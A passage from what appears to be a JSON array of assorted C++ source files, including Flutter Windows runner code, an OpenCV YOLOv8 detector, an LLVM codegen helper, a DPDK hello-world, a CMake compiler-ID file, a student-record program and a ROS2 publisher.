stack;\n\t\t\n\t\t// \uc218\uc2dd \uc804\uccb4\ub97c ()\ub85c \ubb36\uace0 exp_vec \uc5d0 \ub0a8\uc544\uc788\ub294 \uc5f0\uc0b0\uc790\ub4e4\uc774 push \ub418\ub3c4\ub85d... (data \uac12)\n\t\tdata.insert(0, \"(\");\n\t\tdata.push_back(')');\t\t\n\n\t\tfor (int i = 0; i < data.length(); i++) {\n\t\t\t// isalpha : \uc54c\ud30c\ubcb3\uc778\uc9c0 => \ub300\ubd84\uc790\uba74 1, \uc18c\ubb38\uc790\uba74 2, \uc544\ub2c8\uba74 0 \ubc18\ud658\n\t\t\tif (isalpha(data[i])) {\n\t\t\t\texp_vec.push_back(data.substr(i, 2));\n\t\t\t\ti++;\n\t\t\t}\n\t\t\telse if (isdigit(data[i])) {\n\t\t\t\texp_vec.push_back(data.substr(i, 1));\n\t\t\t}\n\t\t\telse if (data[i] == '(' || data[i] == '[' || data[i] == '{') {\n\t\t\t\tstack.push(data.substr(i, 1));\n\t\t\t}\n\t\t\telse if (data[i] == ')' || data[i] == ']' || data[i] == '}') {\n\t\t\t\tstring t = stack.pop();\n\t\t\t\twhile (t != \"(\" && t != \"[\" && t != \"{\") {\n\t\t\t\t\texp_vec.push_back(t);\n\t\t\t\t\tt = stack.pop();\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if (data[i] == '+' || data[i] == '-' || data[i] == '*' || data[i] == '/') {\n\t\t\t\twhile (!stack.is_empty() && precedence(stack.peek()[0]) >= precedence(data[i])) {\n\t\t\t\t\texp_vec.push_back(stack.pop());\n\t\t\t\t}\n\t\t\t\tstack.push(data.substr(i, 1));\n\t\t\t}\n\t\t}\t\t\n\t\t// parsed_expr \uc5d0 exp_vec \uc8fc\uc18c \ud560\ub2f9 =================================================================================>>>>\n\t\t// std::string* Myexcel::ExprCell << Myexcel::Vector Myexcel::ExprCell\t\t\n\t\t// ==> parsed_expr\ub97c Vector* \ub85c \ubc14\uafc8 (excel.h \ud655\uc778)\n\t\t\n\t\tparsed_expr = &exp_vec;\n\t}\n\n\t//",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <fstream>\r\n#include <opencv2/core/mat.hpp>\r\n#include <opencv2/opencv.hpp>\r\nusing namespace std;\r\nusing namespace cv;\r\nusing namespace cv::dnn;\r\n/******************************************************************************************************************/\r\nconst float INPUT_WIDTH = 640.0;\r\nconst float INPUT_HEIGHT = 480.0;\r\nconst float SCORE_THRESHOLD = 0.45;\r\nconst float NMS_THRESHOLD = 0.5;\r\nconst float CONFIDENCE_THRESHOLD = 0.25;\r\n\r\n// Text parameters.\r\nconst float FONT_SCALE = 0.7;\r\nconst int FONT_FACE = FONT_HERSHEY_SIMPLEX;\r\nconst int THICKNESS = 1;\r\n\r\n// Colors.\r\n//const std::vector<cv::Scalar> colors = { cv::Scalar(255, 255, 0), cv::Scalar(0, 255, 0), cv::Scalar(0, 255, 255), cv::Scalar(255, 0, 0) };\r\nScalar BLACK = Scalar(0, 0, 0);\r\nScalar BLUE = Scalar(255, 178, 50);\r\nScalar YELLOW = Scalar(0, 255, 255);\r\nScalar RED = Scalar(0, 0, 255);\r\n/******************************************************************************************************************/\r\nvoid draw_label(Mat& input_image, string label, int left, int top)\r\n{\r\n    // Display the label at the top of the bounding box.\r\n    int baseLine;\r\n    Size label_size = getTextSize(label, FONT_FACE, FONT_SCALE, THICKNESS, &baseLine);\r\n    top = max(top, label_size.height);\r\n    // Top left corner.\r\n    Point tlc = Point(left, top);\r\n    // Bottom right corner.\r\n    Point brc = Point(left + label_size.width, top + label_size.height + baseLine);\r\n    // Draw white rectangle.\r\n    rectangle(input_image, tlc, brc, BLACK, FILLED);\r\n    // Put the label on the black rectangle.\r\n    putText(input_image, label, Point(left, top + label_size.height), FONT_FACE, FONT_SCALE, YELLOW, THICKNESS);\r\n}\r\n/******************************************************************************************************************/\r\nstd::vector<std::string> load_class_list()\r\n{\r\n    std::vector<std::string> class_list;\r\n    std::ifstream ifs(\"classes.txt\");\r\n    std::string line;\r\n    while (getline(ifs, line))\r\n    {\r\n        class_list.push_back(line);\r\n    }\r\n    return class_list;\r\n}\r\n/******************************************************************************************************************/\r\nvoid load_net(cv::dnn::Net& net, bool is_cuda)\r\n{\r\n    auto result = cv::dnn::readNet(\"yolov8s.onnx\");\r\n\r\n    if (is_cuda)\r\n    {\r\n        std::cout << \"Running on GPU using CUDA\\n\";\r\n        result.setPreferableBackend(cv::dnn::DNN_BACKEND_CUDA);\r\n        result.setPreferableTarget(cv::dnn::DNN_TARGET_CUDA_FP16);\r\n    }\r\n    else\r\n    {\r\n        std::cout << \"Running on CPU\\n\";\r\n        result.setPreferableBackend(cv::dnn::DNN_BACKEND_OPENCV);\r\n        result.setPreferableTarget(cv::dnn::DNN_TARGET_CPU);\r\n    }\r\n    net = result;\r\n}\r\n\r\n/******************************************************************************************************************/\r\nvector<Mat> pre_process(Mat& input_image, Net& net)\r\n{\r\n    //Convert to blob.\r\n    Mat blob;\r\n    blobFromImage(input_image, blob, 1. / 255., Size(INPUT_WIDTH, INPUT_HEIGHT), Scalar(), true, false);\r\n    net.setInput(blob);\r\n    vector<Mat> outputs;\r\n    if (!blob.empty()) \r\n\t{\r\n        net.forward(outputs, net.getUnconnectedOutLayersNames());\r\n    }\r\n\r\n    return outputs;\r\n}\r\n/******************************************************************************************************************/\r\nMat post_process(Mat& input_image, vector<Mat>& outputs, const vector<string>& class_name)\r\n{\r\n    // Initialize vectors to hold respective outputs while unwrapping     detections.\r\n    vector<int> class_ids;\r\n    vector<float> confidences;\r\n    vector<Rect> boxes;\r\n\r\n    int rows = outputs[0].size[2];\r\n    int dimensions = outputs[0].size[1];\r\n\r\n    outputs[0] = outputs[0].reshape(1, dimensions);\r\n    cv::transpose(outputs[0], outputs[0]);\r\n\r\n    float* data = (float*)outputs[0].data;\r\n\r\n    // Resizing factor.\r\n    float x_factor = input_image.cols / INPUT_WIDTH;\r\n    float y_factor = input_image.rows / INPUT_HEIGHT;\r\n\r\n    // Iterate through  detections.\r\n    //cout << \"num detections  : \" << rows << \" \" << dimensions << endl;\r\n    for (int i = 0; i < rows; ++i)\r\n    {\r\n        float* classes_scores = data + 4;\r\n\r\n        cv::Mat scores(1, class_name.size(), CV_32FC1, classes_scores);\r\n        cv::Point class_id;\r\n        double maxClassScore;\r\n\r\n        minMaxLoc(scores, 0, &maxClassScore, 0, &class_id);\r\n\r\n        if (maxClassScore > SCORE_THRESHOLD)\r\n        {\r\n            confidences.push_back(maxClassScore);\r\n            class_ids.push_back(class_id.x);\r\n\r\n            float x = data[0];\r\n            float y = data[1];\r\n            float w = data[2];\r\n            float h = data[3];\r\n\r\n            int left = int((x - 0.5 * w) * x_factor);\r\n            int top = int((y - 0.5 * h) * y_factor);\r\n\r\n            int width = int(w * x_factor);\r\n            int height = int(h * y_factor);\r\n\r\n            boxes.push_back(cv::Rect(left, top, width, height));\r\n        }\r\n\r\n        data += dimensions;\r\n    }\r\n    // Perform Non-Maxi",
    "#include <fstream>\n#include <iostream>\n#include <iomanip>\nusing namespace std;\n\nvoid addstudent(){\nofstream f(\"db.txt\",ios::app);\nstring rollno,name,div;\n\ncout<<\"Enter stu details: \"<<endl;\ncout<<\"enter roll no : \"<<endl;\ncin>>rollno;\ncout<<\"enter name: \"<<endl;\ncin>>name;\ncout<<\"enter div: \"<<endl;\ncin>>div;\n\nf<<left<<setw(20)<<rollno<<setw(20)<<name<<setw(20)<<div<<endl;\ncout<<\"student data saved success \";\nf.close();\n}\n\nvoid display(){\nifstream f(\"db.txt\");\nstring line;\nwhile(getline(f,line)){\ncout<<\"\\n\"<<line<<endl;\n}\nf.close();\n}\n\nvoid search(){\nifstream f(\"db.txt\",ios::app);\nstring line;\nstring rollno;\ncout<<\"enter student roll no to find: \"<<endl;\ncin>>rollno;\nbool found;\nwhile(getline(f,line)){\nif(line.find(rollno) != string::npos){\ncout<<\"\\n\"<<line<<endl;\nfound=true;\n}\n}\nf.close();\n\nif(!found){\ncout<<\"student doesnt exist \";\n}\n\n}\n\nvoid deletestudent(){\nifstream f(\"db.txt\");\nstring line;\nstring rollno;\ncout<<\"enter the no. to delete: \"<<endl;\ncin>>rollno;\nstring Filedata;\nwhile(getline(f,line)){\nif(line.find(rollno) == string::npos){\nFiledata+=line;\nFiledata=\"\\n\";\n}\n}\nf.close();\nofstream f1(\"db.txt\",ios::app);\nf1<<Filedata;\nf1.close();\n}\n\nint main(){\nofstream f(\"db.txt\",ios::out);\nf<<left<<setw(20)<<\"roll no.\"<<setw(20)<<\"name\"<<setw(20)<<\"div\"<<endl;\nf.close();\n\nint choice;\n\n\nwhile (choice != -1){\ncout<<\"what action u want to perform: \\n1.insert \\n2.display \\n3.search \\n4.delete \\n5.exit\"<<endl;\ncin>>choice;\nswitch(choice){\n\ncase 1:\naddstudent();\nbreak;\n\ncase 2:\ndisplay();\nbreak;\n\ncase 3:\nsearch();\nbreak;\n\ncase 4:\ndeletestudent();\nbreak;\n\ncase 5:\nreturn 0;\nbreak;\n\ndefault:\ncout<<\"re enter choice: \";\nbreak;\n\n\n}\n\n}\n\n}\n\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include \"codegen.h\"\n#include \"node.h\"\n\nusing namespace std;\n\nextern int yyparse();\nextern NBlock* programBlock;\n\n\nllvm::Function* createPrintfFunction(CodeGenContext& context)\n{\n    std::vector<llvm::Type*> printf_arg_types;\n    printf_arg_types.push_back(llvm::Type::getInt8PtrTy(MyContext)); //char*\n\n    std::cout << \"printf\" << std::endl;\n\n    llvm::FunctionType* printf_type =\n        llvm::FunctionType::get(\n            llvm::Type::getInt32Ty(MyContext), printf_arg_types, true);\n\n    llvm::Function *func = llvm::Function::Create(\n                printf_type, llvm::Function::ExternalLinkage,\n                llvm::Twine(\"printf\"),\n                context.module\n           );\n    func->setCallingConv(llvm::CallingConv::C);\n    return func;\n}\n\nvoid createprintFunction(CodeGenContext& context, llvm::Function* printfFn)\n{\n    std::vector<llvm::Type*> print_arg_types;\n    print_arg_types.push_back(llvm::Type::getInt64Ty(MyContext));\n\n    llvm::FunctionType* print_type =\n        llvm::FunctionType::get(\n            llvm::Type::getVoidTy(MyContext), print_arg_types, false);\n\n    llvm::Function *func = llvm::Function::Create(\n                print_type, llvm::Function::InternalLinkage,\n                llvm::Twine(\"print\"),\n                context.module\n           );\n    llvm::BasicBlock *bblock = llvm::BasicBlock::Create(MyContext, \"entry\", func, 0);\n\tcontext.pushBlock(bblock);\n    \n    const char *constValue = \"%d\\n\";\n    llvm::Constant *format_const = llvm::ConstantDataArray::getString(MyContext, constValue);\n    llvm::GlobalVariable *var =\n        new llvm::GlobalVariable(\n            *context.module, llvm::ArrayType::get(llvm::IntegerType::get(MyContext, 8), strlen(constValue)+1),\n            true, llvm::GlobalValue::PrivateLinkage, format_const, \".str\");\n    llvm::Constant *zero =\n        llvm::Constant::getNullValue(llvm::IntegerType::getInt32Ty(MyContext));\n\n    std::vector<llvm::Constant*> indices;\n    indices.push_back(zero);\n    indices.push_back(zero);\n    llvm::Constant *var_ref = llvm::ConstantExpr::getGetElementPtr(\n\tllvm::ArrayType::get(llvm::IntegerType::get(MyContext, 8), strlen(constValue)+1),\n        var, indices);\n\n    std::vector<Value*> args;\n    args.push_back(var_ref);\n\n    Function::arg_iterator argsValues = func->arg_begin();\n    Value* toPrint = &*argsValues++;\n    toPrint->setName(\"toPrint\");\n    args.push_back(toPrint);\n    \n\tCallInst *call = CallInst::Create(printfFn, makeArrayRef(args), \"\", bblock);\n\tReturnInst::Create(MyContext, bblock);\n\tcontext.popBlock();\n}\n\nvoid createCoreFunctions(CodeGenContext& context){\n\tllvm::Function* printfFn = createPrintfFunction(context);\n    createprintFunction(context,printfFn);\n}\n\n",
    "#include <iostream>\n#include <vector>\n#include <cstdlib>  // For std::atoi\n#include <chrono>\n#include \"HashGenerator.h\"\n#include \"Sorter.h\"\n#include \"FileWriter.h\"\n#include \"cpu_features.h\"\n\nint main(int argc, char* argv[]) {\n    // Initialize CPU features\n    _get_cpu_features();\n    if (argc < 9) {\n        std::cerr << \"Usage: \" << argv[0] \n                  << \" -h <num_hash_threads> -s <num_sort_threads> -w <num_write_threads> -m <memory_size_mb>\\n\";\n        return 1;\n    }\n\n    int num_hash_threads = 1, num_sort_threads = 1, num_write_threads = 1;\n    int memory_size = 128; // Default memory size in MB\n\n    // Parse command line arguments\n    for (int i = 1; i < argc; i++) {\n        if (std::string(argv[i]) == \"-h\" && i + 1 < argc) {\n            num_hash_threads = std::atoi(argv[i + 1]);\n        } else if (std::string(argv[i]) == \"-s\" && i + 1 < argc) {\n            num_sort_threads = std::atoi(argv[i + 1]);\n        } else if (std::string(argv[i]) == \"-w\" && i + 1 < argc) {\n            num_write_threads = std::atoi(argv[i + 1]);\n        } else if (std::string(argv[i]) == \"-m\" && i + 1 < argc) {\n            memory_size = std::atoi(argv[i + 1]);\n        }\n    }\n\n    // Start timing\n    auto start = std::chrono::high_resolution_clock::now();\n\n    // Initialize components with the specified thread counts\n    HashGenerator generator(num_hash_threads);\n    Sorter sorter(num_sort_threads);\n    FileWriter writer(num_write_threads, memory_size);\n\n    // Example data\n    std::string data = \"Example data for hashing.\";\n    std::vector<unsigned char> hashes = generator.generateHashes(data);\n    sorter.sortHashes(hashes);\n    writer.writeHashesToFile(hashes);\n\n    // End timing\n    auto end = std::chrono::high_resolution_clock::now();\n    std::chrono::duration<double, std::milli> elapsed = end - start;\n\n    std::cout << \"Operation with \" << num_hash_threads << \" hash threads, \" \n              << num_sort_threads << \" sort threads, and \" \n              << num_write_threads << \" write threads completed successfully in \" << elapsed.count() << \" ms.\" << std::endl;\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"incomerecordapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/* SPDX-License-Identifier: BSD-3-Clause\n * Copyright(c) 2010-2014 Intel Corporation\n */\n\n#include <stdio.h>\n#include <string.h>\n#include <stdint.h>\n#include <vector>\n#include <string>\n#include <errno.h>\n#include <sys/queue.h>\n\n#include <rte_memory.h>\n#include <rte_launch.h>\n#include <rte_eal.h>\n#include <rte_per_lcore.h>\n#include <rte_lcore.h>\n#include <rte_debug.h>\n\n/* Launch a function on lcore. 8< */\nstatic int\nlcore_hello(__rte_unused void *arg)\n{\n        unsigned lcore_id;\n        lcore_id = rte_lcore_id();\n        printf(\"hello from core %u\\n\", lcore_id);\n        return 0;\n}\n/* >8 End of launching function on lcore. */\n\n/* Initialization of Environment Abstraction Layer (EAL). 8< */\nint main(int argc, char **argv)\n{\n        unsigned lcore_id;\n\n        int ret{};\n        if (argc == 1)\n        {\n            // If no arguments are passed, use default ones\n            char *default_args[] = {argv[0], \"-l\", \"0-3\", \"-n\", \"4\"};\n            argc = sizeof(default_args) / sizeof(default_args[0]);\n   ret = rte_eal_init(argc, default_args);\n        }\n        else\n        {\n            ret = rte_eal_init(argc, argv);\n        }\n\n        if (ret < 0)\n        {\n            rte_panic(\"Cannot init EAL\\n\");\n        }\n        /* >8 End of initialization of Environment Abstraction Layer */\n\n        /**\n         * @brief Once the EAL is initialized, the application is ready to launch a function on an lcore.\n         * lcore_hello() is called on every available lcore.\n         */\n        RTE_LCORE_FOREACH_WORKER(lcore_id){\n                rte_eal_remote_launch(lcore_hello, NULL, lcore_id);\n        }\n\n        /* call it on main lcore too */\n        lcore_hello(NULL);\n        /* >8 End of launching the function on each lcore. */\n\n        rte_eal_mp_wait_lcore();\n\n        /* clean up the EAL */\n        rte_eal_cleanup();\n\n        return 0;\n}\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include \"rclcpp/rclcpp.hpp\"\n#include \"std_msgs/msg/string.hpp\"\n#include \"std_msgs/msg/int32.hpp\"\n#include \"geometry_msgs/msg/vector3.hpp\"\n#include <memory>\n#include <chrono>\n#include <functional>\n//#include <string>\nusing namespace std::chrono_literals;\nvoid callback(rclcpp::Node::SharedPtr node, rclcpp::Publisher<geometry_msgs::msg::Vector3>::SharedPtr pub)\n{\n    //static int count;\n    //auto message = std_msgs::msg::String();\n    auto input = geometry_msgs::msg::Vector3();\n    std::cin >> input.x;\n    std::cin >> input.y;\n    std::cin >> input.z;\n    //message.data = \"Hello world! \" + std::to_string(count++);\n    RCLCPP_INFO(node->get_logger(), \"Publish: %f %f %f\", input.x, input.y, input.z);\n    pub->publish(input);\n    \n}\nint main(int argc, char* argv[])\n{\n    rclcpp::init(argc, argv);\n    auto node = std::make_shared<rclcpp::Node>(\"mynode\");\n    auto qos_profile = rclcpp::QoS(rclcpp::KeepLast(10));\n    auto pub = node->create_publisher<geometry_msgs::msg::Vector3>(\"mytopic\", qos_profile);\n    std::function<void()> fn = std::bind(callback, node, pub);\n    auto timer = node->create_wall_timer(1s, fn);\n    rclcpp::spin(node);\n    rclcpp::shutdown();\n    return 0;\n}",
